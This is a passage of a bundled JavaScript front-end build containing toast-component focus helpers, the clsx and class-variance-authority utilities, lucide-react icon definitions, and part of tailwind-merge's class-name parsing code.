    let raf1 = 0;
    let raf2 = 0;
    raf1 = window.requestAnimationFrame(() => raf2 = window.requestAnimationFrame(fn));
    return () => {
      window.cancelAnimationFrame(raf1);
      window.cancelAnimationFrame(raf2);
    };
  }, [fn]);
}
function isHTMLElement(node) {
  return node.nodeType === node.ELEMENT_NODE;
}
function getTabbableCandidates(container) {
  const nodes = [];
  const walker = document.createTreeWalker(container, NodeFilter.SHOW_ELEMENT, {
    acceptNode: (node) => {
      const isHiddenInput = node.tagName === "INPUT" && node.type === "hidden";
      if (node.disabled || node.hidden || isHiddenInput) return NodeFilter.FILTER_SKIP;
      return node.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP;
    }
  });
  while (walker.nextNode()) nodes.push(walker.currentNode);
  return nodes;
}
function focusFirst(candidates) {
  const previouslyFocusedElement = document.activeElement;
  return candidates.some((candidate) => {
    if (candidate === previouslyFocusedElement) return true;
    candidate.focus();
    return document.activeElement !== previouslyFocusedElement;
  });
}
var Provider = ToastProvider;
var Viewport = ToastViewport;
var Root22 = Toast;
var Title = ToastTitle;
var Description = ToastDescription;
var Action = ToastAction;
var Close = ToastClose;

// node_modules/clsx/dist/clsx.mjs
function r(e) {
  var t, f, n = "";
  if ("string" == typeof e || "number" == typeof e) n += e;
  else if ("object" == typeof e) if (Array.isArray(e)) {
    var o = e.length;
    for (t = 0; t < o; t++) e[t] && (f = r(e[t])) && (n && (n += " "), n += f);
  } else for (f in e) e[f] && (n && (n += " "), n += f);
  return n;
}
function clsx() {
  for (var e, t, f = 0, n = "", o = arguments.length; f < o; f++) (e = arguments[f]) && (t = r(e)) && (n && (n += " "), n += t);
  return n;
}

// node_modules/class-variance-authority/dist/index.mjs
var falsyToString = (value) => typeof value === "boolean" ? `${value}` : value === 0 ? "0" : value;
var cx = clsx;
var cva = (base, config) => (props) => {
  var _config_compoundVariants;
  if ((config === null || config === void 0 ? void 0 : config.variants) == null) return cx(base, props === null || props === void 0 ? void 0 : props.class, props === null || props === void 0 ? void 0 : props.className);
  const { variants, defaultVariants } = config;
  const getVariantClassNames = Object.keys(variants).map((variant) => {
    const variantProp = props === null || props === void 0 ? void 0 : props[variant];
    const defaultVariantProp = defaultVariants === null || defaultVariants === void 0 ? void 0 : defaultVariants[variant];
    if (variantProp === null) return null;
    const variantKey = falsyToString(variantProp) || falsyToString(defaultVariantProp);
    return variants[variant][variantKey];
  });
  const propsWithoutUndefined = props && Object.entries(props).reduce((acc, param) => {
    let [key, value] = param;
    if (value === void 0) {
      return acc;
    }
    acc[key] = value;
    return acc;
  }, {});
  const getCompoundVariantClassNames = config === null || config === void 0 ? void 0 : (_config_compoundVariants = config.compoundVariants) === null || _config_compoundVariants === void 0 ? void 0 : _config_compoundVariants.reduce((acc, param) => {
    let { class: cvClass, className: cvClassName, ...compoundVariantOptions } = param;
    return Object.entries(compoundVariantOptions).every((param2) => {
      let [key, value] = param2;
      return Array.isArray(value) ? value.includes({
        ...defaultVariants,
        ...propsWithoutUndefined
      }[key]) : {
        ...defaultVariants,
        ...propsWithoutUndefined
      }[key] === value;
    }) ? [
      ...acc,
      cvClass,
      cvClassName
    ] : acc;
  }, []);
  return cx(base, getVariantClassNames, getCompoundVariantClassNames, props === null || props === void 0 ? void 0 : props.class, props === null || props === void 0 ? void 0 : props.className);
};

// node_modules/lucide-react/dist/esm/createLucideIcon.js
import { forwardRef as forwardRef9, createElement as createElement3 } from "react";

// node_modules/lucide-react/dist/esm/shared/src/utils.js
var toKebabCase = (string) => string.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase();
var mergeClasses = (...classes) => classes.filter((className, index2, array) => {
  return Boolean(className) && array.indexOf(className) === index2;
}).join(" ");

// node_modules/lucide-react/dist/esm/Icon.js
import { forwardRef as forwardRef8, createElement as createElement2 } from "react";

// node_modules/lucide-react/dist/esm/defaultAttributes.js
var defaultAttributes = {
  xmlns: "http://www.w3.org/2000/svg",
  width: 24,
  height: 24,
  viewBox: "0 0 24 24",
  fill: "none",
  stroke: "currentColor",
  strokeWidth: 2,
  strokeLinecap: "round",
  strokeLinejoin: "round"
};

// node_modules/lucide-react/dist/esm/Icon.js
var Icon = forwardRef8(
  ({
    color = "currentColor",
    size: size4 = 24,
    strokeWidth = 2,
    absoluteStrokeWidth,
    className = "",
    children,
    iconNode,
    ...rest
  }, ref) => {
    return createElement2(
      "svg",
      {
        ref,
        ...defaultAttributes,
        width: size4,
        height: size4,
        stroke: color,
        strokeWidth: absoluteStrokeWidth ? Number(strokeWidth) * 24 / Number(size4) : strokeWidth,
        className: mergeClasses("lucide", className),
        ...rest
      },
      [
        ...iconNode.map(([tag, attrs]) => createElement2(tag, attrs)),
        ...Array.isArray(children) ? children : [children]
      ]
    );
  }
);

// node_modules/lucide-react/dist/esm/createLucideIcon.js
var createLucideIcon = (iconName, iconNode) => {
  const Component = forwardRef9(
    ({ className, ...props }, ref) => createElement3(Icon, {
      ref,
      iconNode,
      className: mergeClasses(`lucide-${toKebabCase(iconName)}`, className),
      ...props
    })
  );
  Component.displayName = `${iconName}`;
  return Component;
};

// node_modules/lucide-react/dist/esm/icons/arrow-right.js
var ArrowRight = createLucideIcon("ArrowRight", [
  ["path", { d: "M5 12h14", key: "1ays0h" }],
  ["path", { d: "m12 5 7 7-7 7", key: "xquz4c" }]
]);

// node_modules/lucide-react/dist/esm/icons/badge-check.js
var BadgeCheck = createLucideIcon("BadgeCheck", [
  [
    "path",
    {
      d: "M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z",
      key: "3c2336"
    }
  ],
  ["path", { d: "m9 12 2 2 4-4", key: "dzmm74" }]
]);

// node_modules/lucide-react/dist/esm/icons/bell.js
var Bell = createLucideIcon("Bell", [
  ["path", { d: "M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9", key: "1qo2s2" }],
  ["path", { d: "M10.3 21a1.94 1.94 0 0 0 3.4 0", key: "qgo35s" }]
]);

// node_modules/lucide-react/dist/esm/icons/calendar.js
var Calendar = createLucideIcon("Calendar", [
  ["path", { d: "M8 2v4", key: "1cmpym" }],
  ["path", { d: "M16 2v4", key: "4m81vk" }],
  ["rect", { width: "18", height: "18", x: "3", y: "4", rx: "2", key: "1hopcy" }],
  ["path", { d: "M3 10h18", key: "8toen8" }]
]);

// node_modules/lucide-react/dist/esm/icons/chart-column.js
var ChartColumn = createLucideIcon("ChartColumn", [
  ["path", { d: "M3 3v16a2 2 0 0 0 2 2h16", key: "c24i48" }],
  ["path", { d: "M18 17V9", key: "2bz60n" }],
  ["path", { d: "M13 17V5", key: "1frdt8" }],
  ["path", { d: "M8 17v-3", key: "17ska0" }]
]);

// node_modules/lucide-react/dist/esm/icons/check.js
var Check = createLucideIcon("Check", [["path", { d: "M20 6 9 17l-5-5", key: "1gmf2c" }]]);

// node_modules/lucide-react/dist/esm/icons/chevron-down.js
var ChevronDown = createLucideIcon("ChevronDown", [
  ["path", { d: "m6 9 6 6 6-6", key: "qrunsl" }]
]);

// node_modules/lucide-react/dist/esm/icons/chevron-left.js
var ChevronLeft = createLucideIcon("ChevronLeft", [
  ["path", { d: "m15 18-6-6 6-6", key: "1wnfg3" }]
]);

// node_modules/lucide-react/dist/esm/icons/chevron-right.js
var ChevronRight = createLucideIcon("ChevronRight", [
  ["path", { d: "m9 18 6-6-6-6", key: "mthhwq" }]
]);

// node_modules/lucide-react/dist/esm/icons/chevron-up.js
var ChevronUp = createLucideIcon("ChevronUp", [["path", { d: "m18 15-6-6-6 6", key: "153udz" }]]);

// node_modules/lucide-react/dist/esm/icons/circle-alert.js
var CircleAlert = createLucideIcon("CircleAlert", [
  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
  ["line", { x1: "12", x2: "12", y1: "8", y2: "12", key: "1pkeuh" }],
  ["line", { x1: "12", x2: "12.01", y1: "16", y2: "16", key: "4dfq90" }]
]);

// node_modules/lucide-react/dist/esm/icons/circle-check-big.js
var CircleCheckBig = createLucideIcon("CircleCheckBig", [
  ["path", { d: "M21.801 10A10 10 0 1 1 17 3.335", key: "yps3ct" }],
  ["path", { d: "m9 11 3 3L22 4", key: "1pflzl" }]
]);

// node_modules/lucide-react/dist/esm/icons/circle-x.js
var CircleX = createLucideIcon("CircleX", [
  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
  ["path", { d: "m15 9-6 6", key: "1uzhvr" }],
  ["path", { d: "m9 9 6 6", key: "z0biqf" }]
]);

// node_modules/lucide-react/dist/esm/icons/circle.js
var Circle = createLucideIcon("Circle", [
  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }]
]);

// node_modules/lucide-react/dist/esm/icons/clock.js
var Clock = createLucideIcon("Clock", [
  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
  ["polyline", { points: "12 6 12 12 16 14", key: "68esgv" }]
]);

// node_modules/lucide-react/dist/esm/icons/download.js
var Download = createLucideIcon("Download", [
  ["path", { d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4", key: "ih7n3h" }],
  ["polyline", { points: "7 10 12 15 17 10", key: "2ggqvy" }],
  ["line", { x1: "12", x2: "12", y1: "15", y2: "3", key: "1vk2je" }]
]);

// node_modules/lucide-react/dist/esm/icons/eye.js
var Eye = createLucideIcon("Eye", [
  [
    "path",
    {
      d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",
      key: "1nclc0"
    }
  ],
  ["circle", { cx: "12", cy: "12", r: "3", key: "1v7zrd" }]
]);

// node_modules/lucide-react/dist/esm/icons/file-pen.js
var FilePen = createLucideIcon("FilePen", [
  ["path", { d: "M12.5 22H18a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v9.5", key: "1couwa" }],
  ["path", { d: "M14 2v4a2 2 0 0 0 2 2h4", key: "tnqrlb" }],
  [
    "path",
    {
      d: "M13.378 15.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z",
      key: "1y4qbx"
    }
  ]
]);

// node_modules/lucide-react/dist/esm/icons/file-text.js
var FileText = createLucideIcon("FileText", [
  ["path", { d: "M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z", key: "1rqfz7" }],
  ["path", { d: "M14 2v4a2 2 0 0 0 2 2h4", key: "tnqrlb" }],
  ["path", { d: "M10 9H8", key: "b1mrlr" }],
  ["path", { d: "M16 13H8", key: "t4e002" }],
  ["path", { d: "M16 17H8", key: "z1uh3a" }]
]);

// node_modules/lucide-react/dist/esm/icons/file.js
var File = createLucideIcon("File", [
  ["path", { d: "M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z", key: "1rqfz7" }],
  ["path", { d: "M14 2v4a2 2 0 0 0 2 2h4", key: "tnqrlb" }]
]);

// node_modules/lucide-react/dist/esm/icons/filter.js
var Filter = createLucideIcon("Filter", [
  ["polygon", { points: "22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3", key: "1yg77f" }]
]);

// node_modules/lucide-react/dist/esm/icons/flag.js
var Flag = createLucideIcon("Flag", [
  ["path", { d: "M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z", key: "i9b6wo" }],
  ["line", { x1: "4", x2: "4", y1: "22", y2: "15", key: "1cm3nv" }]
]);

// node_modules/lucide-react/dist/esm/icons/history.js
var History = createLucideIcon("History", [
  ["path", { d: "M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8", key: "1357e3" }],
  ["path", { d: "M3 3v5h5", key: "1xhq8a" }],
  ["path", { d: "M12 7v5l4 2", key: "1fdv2h" }]
]);

// node_modules/lucide-react/dist/esm/icons/hourglass.js
var Hourglass = createLucideIcon("Hourglass", [
  ["path", { d: "M5 22h14", key: "ehvnwv" }],
  ["path", { d: "M5 2h14", key: "pdyrp9" }],
  [
    "path",
    {
      d: "M17 22v-4.172a2 2 0 0 0-.586-1.414L12 12l-4.414 4.414A2 2 0 0 0 7 17.828V22",
      key: "1d314k"
    }
  ],
  [
    "path",
    { d: "M7 2v4.172a2 2 0 0 0 .586 1.414L12 12l4.414-4.414A2 2 0 0 0 17 6.172V2", key: "1vvvr6" }
  ]
]);

// node_modules/lucide-react/dist/esm/icons/house.js
var House = createLucideIcon("House", [
  ["path", { d: "M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8", key: "5wwlr5" }],
  [
    "path",
    {
      d: "M3 10a2 2 0 0 1 .709-1.528l7-5.999a2 2 0 0 1 2.582 0l7 5.999A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",
      key: "1d0kgt"
    }
  ]
]);

// node_modules/lucide-react/dist/esm/icons/info.js
var Info = createLucideIcon("Info", [
  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
  ["path", { d: "M12 16v-4", key: "1dtifu" }],
  ["path", { d: "M12 8h.01", key: "e9boi3" }]
]);

// node_modules/lucide-react/dist/esm/icons/layout-grid.js
var LayoutGrid = createLucideIcon("LayoutGrid", [
  ["rect", { width: "7", height: "7", x: "3", y: "3", rx: "1", key: "1g98yp" }],
  ["rect", { width: "7", height: "7", x: "14", y: "3", rx: "1", key: "6d4xhi" }],
  ["rect", { width: "7", height: "7", x: "14", y: "14", rx: "1", key: "nxv5o0" }],
  ["rect", { width: "7", height: "7", x: "3", y: "14", rx: "1", key: "1bb6yr" }]
]);

// node_modules/lucide-react/dist/esm/icons/loader-circle.js
var LoaderCircle = createLucideIcon("LoaderCircle", [
  ["path", { d: "M21 12a9 9 0 1 1-6.219-8.56", key: "13zald" }]
]);

// node_modules/lucide-react/dist/esm/icons/log-out.js
var LogOut = createLucideIcon("LogOut", [
  ["path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4", key: "1uf3rs" }],
  ["polyline", { points: "16 17 21 12 16 7", key: "1gabdz" }],
  ["line", { x1: "21", x2: "9", y1: "12", y2: "12", key: "1uyos4" }]
]);

// node_modules/lucide-react/dist/esm/icons/map-pin.js
var MapPin = createLucideIcon("MapPin", [
  [
    "path",
    {
      d: "M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0",
      key: "1r0f0z"
    }
  ],
  ["circle", { cx: "12", cy: "10", r: "3", key: "ilqhr7" }]
]);

// node_modules/lucide-react/dist/esm/icons/package.js
var Package = createLucideIcon("Package", [
  [
    "path",
    {
      d: "M11 21.73a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73z",
      key: "1a0edw"
    }
  ],
  ["path", { d: "M12 22V12", key: "d0xqtd" }],
  ["path", { d: "m3.3 7 7.703 4.734a2 2 0 0 0 1.994 0L20.7 7", key: "yx3hmr" }],
  ["path", { d: "m7.5 4.27 9 5.15", key: "1c824w" }]
]);

// node_modules/lucide-react/dist/esm/icons/pause.js
var Pause = createLucideIcon("Pause", [
  ["rect", { x: "14", y: "4", width: "4", height: "16", rx: "1", key: "zuxfzm" }],
  ["rect", { x: "6", y: "4", width: "4", height: "16", rx: "1", key: "1okwgv" }]
]);

// node_modules/lucide-react/dist/esm/icons/plus.js
var Plus = createLucideIcon("Plus", [
  ["path", { d: "M5 12h14", key: "1ays0h" }],
  ["path", { d: "M12 5v14", key: "s699le" }]
]);

// node_modules/lucide-react/dist/esm/icons/printer.js
var Printer = createLucideIcon("Printer", [
  [
    "path",
    {
      d: "M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2",
      key: "143wyd"
    }
  ],
  ["path", { d: "M6 9V3a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1v6", key: "1itne7" }],
  ["rect", { x: "6", y: "14", width: "12", height: "8", rx: "1", key: "1ue0tg" }]
]);

// node_modules/lucide-react/dist/esm/icons/refresh-cw.js
var RefreshCw = createLucideIcon("RefreshCw", [
  ["path", { d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8", key: "v9h5vc" }],
  ["path", { d: "M21 3v5h-5", key: "1q7to0" }],
  ["path", { d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16", key: "3uifl3" }],
  ["path", { d: "M8 16H3v5", key: "1cv678" }]
]);

// node_modules/lucide-react/dist/esm/icons/rotate-ccw.js
var RotateCcw = createLucideIcon("RotateCcw", [
  ["path", { d: "M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8", key: "1357e3" }],
  ["path", { d: "M3 3v5h5", key: "1xhq8a" }]
]);

// node_modules/lucide-react/dist/esm/icons/search.js
var Search = createLucideIcon("Search", [
  ["circle", { cx: "11", cy: "11", r: "8", key: "4ej97u" }],
  ["path", { d: "m21 21-4.3-4.3", key: "1qie3q" }]
]);

// node_modules/lucide-react/dist/esm/icons/settings.js
var Settings = createLucideIcon("Settings", [
  [
    "path",
    {
      d: "M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z",
      key: "1qme2f"
    }
  ],
  ["circle", { cx: "12", cy: "12", r: "3", key: "1v7zrd" }]
]);

// node_modules/lucide-react/dist/esm/icons/shield.js
var Shield = createLucideIcon("Shield", [
  [
    "path",
    {
      d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
      key: "oel41y"
    }
  ]
]);

// node_modules/lucide-react/dist/esm/icons/square-pen.js
var SquarePen = createLucideIcon("SquarePen", [
  ["path", { d: "M12 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7", key: "1m0v6g" }],
  [
    "path",
    {
      d: "M18.375 2.625a1 1 0 0 1 3 3l-9.013 9.014a2 2 0 0 1-.853.505l-2.873.84a.5.5 0 0 1-.62-.62l.84-2.873a2 2 0 0 1 .506-.852z",
      key: "ohrbg2"
    }
  ]
]);

// node_modules/lucide-react/dist/esm/icons/trash-2.js
var Trash2 = createLucideIcon("Trash2", [
  ["path", { d: "M3 6h18", key: "d0wm0j" }],
  ["path", { d: "M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6", key: "4alrt4" }],
  ["path", { d: "M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2", key: "v07s0e" }],
  ["line", { x1: "10", x2: "10", y1: "11", y2: "17", key: "1uufr5" }],
  ["line", { x1: "14", x2: "14", y1: "11", y2: "17", key: "xtxkd" }]
]);

// node_modules/lucide-react/dist/esm/icons/trending-up.js
var TrendingUp = createLucideIcon("TrendingUp", [
  ["polyline", { points: "22 7 13.5 15.5 8.5 10.5 2 17", key: "126l90" }],
  ["polyline", { points: "16 7 22 7 22 13", key: "kwv8wd" }]
]);

// node_modules/lucide-react/dist/esm/icons/triangle-alert.js
var TriangleAlert = createLucideIcon("TriangleAlert", [
  [
    "path",
    {
      d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",
      key: "wmoenq"
    }
  ],
  ["path", { d: "M12 9v4", key: "juzpu7" }],
  ["path", { d: "M12 17h.01", key: "p32p05" }]
]);

// node_modules/lucide-react/dist/esm/icons/upload.js
var Upload = createLucideIcon("Upload", [
  ["path", { d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4", key: "ih7n3h" }],
  ["polyline", { points: "17 8 12 3 7 8", key: "t8dd8p" }],
  ["line", { x1: "12", x2: "12", y1: "3", y2: "15", key: "widbto" }]
]);

// node_modules/lucide-react/dist/esm/icons/user.js
var User = createLucideIcon("User", [
  ["path", { d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2", key: "975kel" }],
  ["circle", { cx: "12", cy: "7", r: "4", key: "17ys0d" }]
]);

// node_modules/lucide-react/dist/esm/icons/users.js
var Users = createLucideIcon("Users", [
  ["path", { d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2", key: "1yyitq" }],
  ["circle", { cx: "9", cy: "7", r: "4", key: "nufk8" }],
  ["path", { d: "M22 21v-2a4 4 0 0 0-3-3.87", key: "kshegd" }],
  ["path", { d: "M16 3.13a4 4 0 0 1 0 7.75", key: "1da9ce" }]
]);

// node_modules/lucide-react/dist/esm/icons/x.js
var X = createLucideIcon("X", [
  ["path", { d: "M18 6 6 18", key: "1bl5f8" }],
  ["path", { d: "m6 6 12 12", key: "d8bk6v" }]
]);

// node_modules/tailwind-merge/dist/bundle-mjs.mjs
var CLASS_PART_SEPARATOR = "-";
var createClassGroupUtils = (config) => {
  const classMap = createClassMap(config);
  const {
    conflictingClassGroups,
    conflictingClassGroupModifiers
  } = config;
  const getClassGroupId = (className) => {
    const classParts = className.split(CLASS_PART_SEPARATOR);
    if (classParts[0] === "" && classParts.length !== 1) {
      classParts.shift();
    }
    return getGroupRecursive(classParts, classMap) || getGroupIdForArbitraryProperty(className);
  };
  const getConflictingClassGroupIds = (classGroupId, hasPostfixModifier) => {
    const conflicts = conflictingClassGroups[classGroupId] || [];
    if (hasPostfixModifier && conflictingClassGroupModifiers[classGroupId]) {
      return [...conflicts, ...conflictingClassGroupModifiers[classGroupId]];
    }
    return conflicts;
  };
  return {
    getClassGroupId,
    getConflictingClassGroupIds
  };
};
var getGroupRecursive = (classParts, classPartObject) => {
  if (classParts.length === 0) {
    return classPartObject.classGroupId;
  }
  const currentClassPart = classParts[0];
  const nextClassPartObject = classPartObject.nextPart.get(currentClassPart);
  const classGroupFromNextClassPart = nextClassPartObject ? getGroupRecursive(classParts.slice(1), nextClassPartObject) : void 0;
  if (classGroupFromNextClassPart) {
    return classGroupFromNextClassPart;
  }
  if (classPartObject.validators.length === 0) {
    return void 0;
  }
  const classRest = classParts.join(CLASS_PART_SEPARATOR);
  return classPartObject.validators.find(({
    validator
  }) => validator(classRest))?.classGroupId;
};
var arbitraryPropertyRegex = /^\[(.+)\]$/;
var getGroupIdForArbitraryProperty = (className) => {
  if (arbitraryPropertyRegex.test(className)) {
    const arbitraryPropertyClassName = arbitraryPropertyRegex.exec(className)[1];
    const property = arbitraryPropertyClassName?.substring(0, arbitraryPropertyClassName.indexOf(":"));
    if (property) {
      return "arbitrary.." + property;
    }
  }
};
var createClassMap = (config) => {
  const {
    theme,
    prefix
  } = config;
  const classMap = {
    nextPart: /* @__PURE__ */ new Map(),
    validators: []
  };
  const prefixedClassGroupEntries = getPrefixedClassGroupEntries(Object.entries(config.classGroups), prefix);
  prefixedClassGroupEntries.forEach(([classGroupId, classGroup]) => {
    processClassesRecursively(classGroup, classMap, classGroupId, theme);
  });
  return classMap;
};
var processClassesRecursively = (classGroup, classPartObject, classGroupId, theme) => {
  classGroup.forEach((classDefinition) => {
    if (typeof classDefinition === "string") {
      const classPartObjectToEdit = classDefinition === "" ? classPartObject : getPart(classPartObject, classDefinition);
      classPartObjectToEdit.classGroupId = classGroupId;
      return;
    }
    if (typeof classDefinition === "function") {
      if (isThemeGetter(classDefinition)) {
        processClassesRecursively(classDefinition(theme), classPartObject, classGroupId, theme);
        return;
      }
      classPartObject.validators.push({
        validator: classDefinition,
        classGroupId
      });
      return;
    }
    Object.entries(classDefinition).forEach(([key, classGroup2]) => {
      processClassesRecursively(classGroup2, getPart(classPartObject, key), classGroupId, theme);
    });
  });
};
var getPart = (classPartObject, path) => {
  let currentClassPartObject = classPartObject;
  path.split(CLASS_PART_SEPARATOR).forEach((pathPart) => {
    if (!currentClassPartObject.nextPart.has(pathPart)) {
      currentClassPartObject.nextPart.set(pathPart, {
        nextPart: /* @__PURE__ */ new Map(),
        validators: []
      });
    }
    currentClassPartObject = currentClassPartObject.nextPart.get(pathPart);
  });
  return currentClassPartObject;
};
var isThemeGetter = (func) => func.isThemeGetter;
var getPrefixedClassGroupEntries = (classGroupEntries, prefix) => {
  if (!prefix) {
    return classGroupEntries;
  }
  return classGroupEntries.map(([classGroupId, classGroup]) => {
    const prefixedClassGroup = classGroup.map((classDefinition) => {
      if (typeof classDefinition === "string") {
        return prefix + classDefinition;
      }
      if (typeof classDefinition === "object") {
        return Object.fromEntries(Object.entries(classDefinition).map(([key, value]) => [prefix + key, value]));
      }
      return classDefinition;
    });
    return [classGroupId, prefixedClassGroup];
  });
};
var createLruCache = (maxCacheSize) => {
  if (maxCacheSize < 1) {
    return {
      get: () => void 0,
      set: () => {
      }
    };
  }
  let cacheSize = 0;
  let cache = /* @__PURE__ */ new Map();
  let previousCache = /* @__PURE__ */ new Map();
  const update = (key, value) => {
    cache.set(key, value);
    cacheSize++;
    if (cacheSize > maxCacheSize) {
      cacheSize = 0;
      previousCache = cache;
      cache = /* @__PURE__ */ new Map();
    }
  };
  return {
    get(key) {
      let value = cache.get(key);
      if (value !== void 0) {
        return value;
      }
      if ((value = previousCache.get(key)) !== void 0) {
        update(key, value);
        return value;
      }
    },
    set(key, value) {
      if (cache.has(key)) {
        cache.set(key, value);
      } else {
        update(key, value);
      }
    }
  };
};
var IMPORTANT_MODIFIER = "!";
var createParseClassName = (config) => {
  const {
    separator,
    experimentalParseClassName
  } = config;
  const isSeparatorSingleCharacter = separator.length === 1;
  const firstSeparatorCharacter = separator[0];
  const separatorLength = separator.length;
  const parseClassName = (className) => {
    const modifiers = [];
    let bracketDepth = 0;
    let modifierStart = 0;
    let postfixModifierPosition;
    for (let index2 = 0; index2 < className.length; index2++) {
      let currentCharacter = className[index2];
      if (bracketDepth === 0) {
        if (currentCharacter === firstSeparatorCharacter && (isSeparatorSingleCharacter || className.slice(index2, index2 + separatorLength) === separator)) {
          modifiers.push(className.slice(modifierStart, index2));
          modifierStart = index2 + separatorLength;
          continue;
        }
        if (currentCharacter === "/") {
          postfixModifierPosition = index2;
          continue;
        }
      }
      if (currentCharacter === "[") {
        bracketDepth++;
      } else if (currentCharacter === "]") {
        bracketDepth--;
      }
    }
    const baseClassNameWithImportantModifier = modifiers.length === 0 ? className : className.substring(modifierStart);
    const hasImportantModifier = baseClassNameWithImportantModifier.startsWith(IMPORTANT_MODIFIER);
    const baseClassName = hasImportantModifier ? baseClassNameWithImportantModifier.substring(1) : baseClassNameWithImportantModifier;
    const maybePostfixModifierPosition = postfixModifierPosition && postfixModifierPosition > modifierStart ? postfixModifierPosition - modifierStart : void 0;
    return {
      modifiers,
      hasImportantModifier,
      baseClassName,
      maybePostfixModifierPosition
    };
  };
  if (experimentalParseClassName) {
    return (className) => experimentalParseClassName({
      className,
      parseClassName
    });
  }
  return parseClassName;
};
var sortModifiers = (modifiers) => {
  if (modifiers.length <= 1) {
    return modifiers;
  }
  const sortedModifiers = [];
  let unsortedModifiers = [];
  modifiers.forEach((modifier) => {
    const isArbitraryVariant = modifier[0] === "[";
    if (isArbitraryVariant) {
      sortedModifiers.push(...unsortedModifiers.sort(), modifier);
      unsortedModifiers = [];
    } else {
      unsortedModifiers.push(modifier);
    }
  });
  sortedModifiers.push(...unsortedModifiers.sort());
  return sortedModifiers;
};
var createConfigUtils = (config) => ({
  cache: createLruCache(config.cacheSize),
  parseClassName: createParseClassName(config),
  ...createClassGroupUtils(config)
});
var SPLIT_CLASSES_REGEX = /\s+/;
var mergeClassList = (classList, configUtils) => {
  const {
    parseClassName,
    getClassGroupId,
    getConflictingClassGroupIds
  } = configUtils;
  const classGroupsInConflict = [];
  const classNames = classList.trim().split(SPLIT_CLASSES_REGEX);
  let result = "";
  for (let index2 = classNames.length - 1; index2 >= 0; index2 -= 1) {
    const originalClassName = classNames[index2];
    const {
      modifiers,
      hasImportantModifier,
      baseClassName,
      maybePostfixModifierPosition
    } = parseClassName(originalClassName);
    let hasPostfixModifier = Boolean(maybePostfixModifierPosition);
    let classGroupId = getClassGroupId(hasPostfixModifier ? baseClassName.substring(0, maybePostfixModifierPosition) : baseClassName);
    if (!classGroupId) {
